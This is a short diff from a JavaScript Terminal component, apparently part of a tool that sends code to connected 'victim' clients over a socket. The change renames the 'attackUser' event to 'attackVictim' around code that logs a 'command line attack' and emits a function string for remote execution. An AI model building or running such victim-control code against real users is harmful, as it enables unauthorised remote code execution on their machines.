@@ -52,7 +52,7 @@ class Terminal extends Component {
         this.props.logger(`Executing command line attack on victim ${this.props.victimIdBySocketIdMap[socketId]}...`)
         let attackInstanceId = `${socketId}_${new Date().valueOf()}`
         this.props.followupBuffer[attackInstanceId] = function(params, logger){}
-        this.props.socket.emit('attackUser', {
+        this.props.socket.emit('attackVictim', {
           victimSocket: socketId,
           attack: `function(params){
             params.time = new Date();
